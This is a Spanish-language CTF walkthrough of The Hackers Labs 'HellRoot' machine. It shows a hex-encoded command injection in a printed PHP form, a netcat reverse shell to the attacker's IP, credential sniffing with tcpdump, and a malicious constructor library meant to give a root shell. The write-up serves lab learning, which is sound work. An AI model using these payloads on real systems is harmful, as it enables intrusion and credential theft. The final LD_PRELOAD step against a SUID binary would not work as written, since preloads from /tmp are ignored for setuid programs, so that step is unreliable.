
# 🚀 The Hackers Labs - HellRoot CTF Write-Up

![HellRoot Logo](https://via.placeholder.com/150) <!-- Reemplazar con imagen real -->

**🏷️ Tags:** `#HellRoot` `#Gitea` `#TCPDump` `#ldd`  | **📊 Dificultad:** [Media] | **🖥️ Plataforma:** [The Hackers Labs]

---

## 📌 Resumen

Este CTF combina **explotación web**, **post-explotación en contenedores Docker** y **escalada de privilegios** mediante vulnerabilidades en binarios SUID. La cadena de ataque comienza con una **inyección de comandos** en una aplicación PHP vulnerable, que nos permite ejecutar código remoto. Tras acceder a un contenedor Docker, **capturamos credenciales** mediante *sniffing* de tráfico con `tcpdump`, y finalmente escalamos a **root** explotando una biblioteca dinámica mal configurada.

---

## 🛠️ Configuración del Entorno

1. **Descarga del laboratorio**:
   - Obtener el archivo `.ova` desde [The Hackers Labs](https://thehackerslabs.com).
   - Descomprimir el archivo `.zip`.
   - Importar el `.ova` en **VirtualBox**.

> ⚠️ **Nota**: Asegúrate de configurar la red en modo **NAT** o **Bridge** para permitir la comunicación con la máquina víctima.

---

## 🔍 Fase de Reconocimiento

### 1️⃣ Identificación del Target

- **Dirección IP del objetivo**: `192.168.100.31`
- **MAC Address**: `08:00:27:5c:89:6f` (PCS Systemtechnik GmbH)
- **Sistema Operativo**: Linux (TTL: 64)

```bash
sudo arp-scan -I wlan0 --localnet --ignoredups
ping -c 1 192.168.100.31
wichSystem.py 192.168.100.31  # Resultado: TTL: 64 → Linux
```

---

## 🌐 Enumeración de Puertos y Servicios

### 🔎 Escaneo de Puertos (1-65535)

```bash
# Herramienta personalizada en Python
escanerTCP.py -t 192.168.100.31 -p 1-65000

# Nmap (rápido y agresivo)
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.31 -oG allPorts
extractPorts allPorts
```

### 📋 Servicios Detectados

| **Puerto** | **Servicio**       | **Versión**                     | **Observaciones**                     |
|------------|--------------------|---------------------------------|---------------------------------------|
| 22         | SSH                | OpenSSH 9.2p1 Debian            |                                       |
| 80         | HTTP               | Apache httpd 2.4.62 (Debian)    | Página por defecto                    |
| 222        | SSH                | OpenSSH 10.0                    | Posible entorno separado              |
| 443        | HTTPS              | nginx 1.29.0                    | Redirige a `git.hellroot.thl`        |
| 5000       | HTTP               | Apache                          | Servicio "Domain Lookup Service"     |

---

## 🌐 Análisis del Servicio Web Principal

### 🔗 Acceso a la Web

- **Puerto 80**: `http://192.168.100.31/` (Apache por defecto).
- **Puerto 443**: `https://git.hellroot.thl/` (requiere edición de `/etc/hosts`).

```bash
echo "192.168.100.31 git.hellroot.thl" >> /etc/hosts
```

### 🛠️ Tecnologías Detectadas

```bash
whatweb https://git.hellroot.thl/
```
**Resultado**:
- **Servidor**: nginx/1.29.0
- **Tecnología**: Gitea (forja de software autohospedada)
- **Cookies**: `_csrf`, `i_like_gitea`
- **X-Frame-Options**: `SAMEORIGIN`

---

## 🔍 Enumeración de Gitea

### 📂 Fuzzing de Directorios

```bash
gobuster dir -u https://git.hellroot.thl/ \
     -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
     -t 50 -x php,php.back,backup,txt,html,js,java,py,zip --no-tls-validation
```

**Hallazgos**:
- `/issues` → Redirige a `/user/login`
- `/v2` → 401 Unauthorized
- `/explore` → Redirige a `/explore/repos`
- **`/astro`** → 🔥 **¡Repositorio interesante!**

### 📁 Repositorio `astro/hellroot.thl`

- **URL**: `https://git.hellroot.thl/Astro/hellroot.thl`
- **Archivos**:
  - `Dockerfile` → Contiene credenciales (`astro:iloveastro`).
  - `index.php` → **Vulnerabilidad crítica**.

---

## 💥 Explotación de Vulnerabilidades

### 🐍 Análisis del Código Vulnerable (`index.php`)

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    ob_start();

    if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }

    echo '<pre class="result">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';
    ob_end_flush();
}
?>
```

**🔴 Vulnerabilidad**:
- **Inyección de comandos** por falta de sanitización.
- **Decodificación hexadecimal** (`hex2bin`) que permite evadir filtros.

---

### 🚀 Explotación: Reverse Shell

#### 1️⃣ Convertir comando a hexadecimal

```bash
echo -n "whoami;" | xxd -p
# Salida: 77686f616d693b
```

#### 2️⃣ Ejecutar comando en la web

- **Input**: `77686f616d693b`
- **Respuesta**: `www-data`

#### 3️⃣ Reverse Shell

```bash
# Ponerse en escucha
nc -nlvp 443

# Convertir reverse shell a hexadecimal
echo -n "nc -c sh 192.168.100.26 443;" | xxd -p
# Salida: 6e63202d63207368203139322e3136382e3130302e3236203434333b

# Pegar en el input de la web
```

> ✅ **Acceso obtenido**: Shell como `www-data` en el contenedor Docker.

---

## 🐳 Post-Explotación en el Contenedor

### 🔑 Credenciales del Usuario `astro`

```bash
su astro  # Contraseña: iloveastro
```

### 📋 Permisos de `sudo`

```bash
sudo -l
```
**Resultado**:
```
User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
```

### 🚀 Escalada a Root

```bash
sudo /bin/su root
```

---

## 🔍 Captura de Tráfico (Sniffing con `tcpdump`)

### 📌 Pista en `/sniff.txt`

```bash
gobuster dir -u http://192.168.100.31:5000/ \
     -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
     -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

**Hallazgo**: `/sniff.txt` → Contiene pista sobre herramientas de sniffing.

### 🛠️ Captura de Credenciales

```bash
# Capturar tráfico en eth0
sudo tcpdump -i eth0 -A -s0 -w gitea_capture.pcap \
     "host 172.17.0.2 and (port 80 or port 3000 or port 443)"

# Analizar captura
tcpdump -r gitea_capture.pcap -n -A
```

**🔍 Hallazgo en el PCAP**:
```
username=astro&password=wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS
```

### 🔐 Acceso SSH al Host

```bash
ssh astro@192.168.100.31
# Contraseña: wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS
```

**🏁 Flag de usuario**:
```bash
cat ~/user.txt
```

---

## 🔓 Escalada Final a Root

### 🔍 Binarios SUID

```bash
find / -perm -4000 -ls 2>/dev/null
```
**Resultado**:
```
/usr/local/bin/secmonitor  🔥
```

### 🛠️ Análisis con `ldd`

```bash
ldd /usr/local/bin/secmonitor
```
**Salida**:
```
linux-vdso.so.1 (0x00007ffca8bbf000)
libmonitor.so => /usr/local/lib/libmonitor.so (0x00007fa084298000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa0840b7000)
/lib64/ld-linux-x86-64.so.2 (0x00007fa0842ab000)
```

> 🔴 **Vulnerabilidad**: `libmonitor.so` es una biblioteca personalizada que se carga en `/usr/local/lib/`.

---

### 💀 Explotación: Biblioteca Maliciosa

#### 1️⃣ Crear `libmonitor.so` malicioso

```c
// /tmp/malicious_lib.c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

#### 2️⃣ Compilar

```bash
gcc -shared -fPIC -o /tmp/libmonitor.so /tmp/malicious_lib.c
```

#### 3️⃣ Ejecutar con `LD_PRELOAD`

```bash
LD_PRELOAD=/tmp/libmonitor.so /usr/local/bin/secmonitor
```

> ✅ **Root shell obtenida!**

**🏁 Flag de root**:
```bash
cat /root/root.txt
```

---

## 📝 Evidencia de Compromiso

```bash
[+] Hacked: root
[+] TheHackersLabs — HellRoot [Write-Up]
[+] Autor: APS88
```

---

## 🎯 Conclusiones

1. **Cadena de Explotación**:
   - Inyección de comandos → Reverse Shell → Contenedor Docker → Sniffing → Credenciales → SSH → Binario SUID → Root.

2. **Lecciones Aprendidas**:
   - **Validar siempre las entradas** en aplicaciones web.
   - **Proteger bibliotecas dinámicas** en binarios SUID.
   - **Usar herramientas como `ldd` y `tcpdump`** para enumeración avanzada.

3. **Herramientas Clave**:
   - `nmap`, `gobuster`, `xxd`, `nc`, `tcpdump`, `ldd`, `gcc`.

---

## 📚 Recursos Adicionales

- [Gitea - Documentación Oficial](https://docs.gitea.io/)
- [Linux SUID Explained](https://www.hackingarticles.in/linux-privilege-escalation-suid-binaries/)
- [LD_PRELOAD Tricks](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)

